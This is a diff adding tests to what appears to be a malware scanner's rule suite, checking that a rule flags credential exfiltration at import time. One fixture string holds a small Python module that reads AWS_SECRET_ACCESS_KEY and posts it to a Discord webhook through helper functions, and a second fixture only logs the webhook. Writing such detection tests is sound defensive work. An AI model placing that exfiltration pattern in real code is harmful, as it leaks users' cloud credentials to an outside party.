@@ -272,6 +272,35 @@ class TestADestinationOnlyWrittenAtImport:
         )
         assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
 
+    def test_a_drop_point_sent_through_the_files_own_helpers_at_import(
+        self, tmp_path: Path
+    ) -> None:
+        # sf_th_requests 0.1.0: credentials -> send_to_beacon -> post(BEACON_URL) -> urlopen.
+        module = (
+            "import json, os, urllib.request\n"
+            "BEACON_URL = 'https://discord.com/api/webhooks/1/abc'\n"
+            "def _make_request(url, data):\n"
+            "    req = urllib.request.Request(url, data=data)\n"
+            "    return urllib.request.urlopen(req)\n"
+            "def post(url, data):\n"
+            "    return _make_request(url, json.dumps(data).encode())\n"
+            "def send_to_beacon(creds):\n"
+            "    post(BEACON_URL, creds)\n"
+            "send_to_beacon({'k': os.environ.get('AWS_SECRET_ACCESS_KEY')})\n"
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" in self.rules(tmp_path, module)
+
+    def test_a_drop_point_handed_to_a_helper_that_only_logs_is_not(self, tmp_path: Path) -> None:
+        module = (
+            "import logging, urllib.request\n"
+            "HOOK = 'https://discord.com/api/webhooks/1/abc'\n"
+            "def describe(url):\n"
+            "    logging.getLogger(__name__).info('events go to %s', url)\n"
+            "describe(HOOK)\n"
+            "urllib.request.urlopen('https://pypi.org/simple/')\n"
+        )
+        assert "MALWARE.EXFIL.INSTALL_CALLBACK.001" not in self.rules(tmp_path, module)
+
     def test_a_drop_point_name_only_printed_or_logged_is_not(self, tmp_path: Path) -> None:
         # The name on a line with no request: a message about where events would go.
         module = (
